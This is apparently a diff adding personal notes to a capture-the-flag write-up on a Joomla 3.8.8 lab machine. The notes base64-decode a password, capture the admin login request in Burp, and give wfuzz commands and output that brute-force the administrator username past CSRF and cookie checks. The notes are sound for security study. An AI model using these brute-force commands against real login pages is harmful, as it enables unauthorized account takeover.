@@ -38,3 +38,89 @@ Version is 3.8.8
 Searching for "Joomla Changelog 3.8.8" shows a date of May 22, 2018
 Searching for "Joomla core Vulnerabilites" returns this list of CVEs 
 https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html
+
+5. Taking a look at the secret.txt content 
+A hint that it is base64 is that you can divide the char string by 4 sets of 4
+base64 decoding the chars
+└─$ base64 -d creds 
+Curling2018! 
+
+update to joomla-creds file to now be the result of the decode
+
+6. Attempting to brute force the admin login
+default is /administrator/
+intercept the login request in burp while passing the joomla-creds
+
+POST /administrator/index.php HTTP/1.1
+Host: 10.10.10.150
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+Origin: http://10.10.10.150
+Connection: close
+Referer: http://10.10.10.150/administrator/index.php
+Cookie: c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=g48rjggfue674jd04etnjqra9g
+Upgrade-Insecure-Requests: 1
+
+username=TESTUSERNAME&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1
+
+Using the usename and password string from the above request I will use wfuzz to brute force
+
+7. wfuzz with cewl and joomla-creds
+┌──(kali㉿kali)-[~/CTF/JvP-prep/joomla/curling]
+└─$ wfuzz -w cewl-output.txt -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1' http://10.10.10.150/administrator/index.php
+
+inital command results in all 303 responses. 
+
+Sending wfuzz through burp to see whats update
+
+responses coming back are: 
+HTTP/1.1 303 See other
+Date: Thu, 15 Jul 2021 23:39:40 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: 99fb082d992a92668ce87e5540bd20fa=03fn1dma7m7sf36a9h15lngkp4; path=/; HttpOnly
+Location: /administrator/index.php
+Expires: Wed, 17 Aug 2005 00:00:00 GMT
+Last-Modified: Thu, 15 Jul 2021 23:39:40 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+NOTE: If I go to an existing request like the POST above and remove the cookie information then send it I get back the same 303 response
+
+The 303's are happening because there seems to be a relationship between the cookie and this value 
+
+Go to proxy-> options and select intercept responses (uncheck content types) under Intercept Server Responses . 
+
+turn intercept on and reload the admin page 
+
+Server response includes: 
+</style>
+	<script type="application/json" class="joomla-script-options new">{"csrf.token":"6c53866cdc7531b2e4e22f98c372b2e8","system.paths":{"root":"","base":"\/administrator"},"system.keepalive":{"interval":840000,"uri":"\/administrator\/index.php"}}
+
+so a csrf token is being set and placed in the "return=<TOKEN HERE>" value
+
+Passing the cookie into wfuzz:
+┌──(kali㉿kali)-[~/CTF/JvP-prep/joomla/curling]
+└─$ wfuzz -w cewl-output.txt -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&252373a42b78c331f34081aef814f02d=1' -b 'c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=rmkorehst9rsr3fsdmc2bq7bk7' -p 127.0.0.1:8080 http://10.10.10.150/administrator/index.php
+
+A lot of responses coming back with 200 (failed login I assume). Running again to hide the 200 responses. 
+
+wfuzz -w cewl-output.txt --hc 200 -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&6c53866cdc7531b2e4e22f98c372b2e8=1' -b 'c0548020854924e0aecd05ed9f5b672b=dsh3dqkn8q1p6fnqq4s1jk8a3f; 99fb082d992a92668ce87e5540bd20fa=rmkorehst9rsr3fsdmc2bq7bk7' http://10.10.10.150/administrator/index.php
+
+--d == POST data
+--b == cookie 
+
+Results: 
+
+000000187:   303        0 L      0 W        0 Ch        "Floris"                                                                                      
+000000218:   303        0 L      0 W        0 Ch        "new"                                                                                         
+000000214:   500        0 L      1 W        5 Ch        "have"                                                                                        
+000000208:   303        0 L      0 W        0 Ch        "associated"   
+
+Testing Floris:Curling2018! and now logged in.
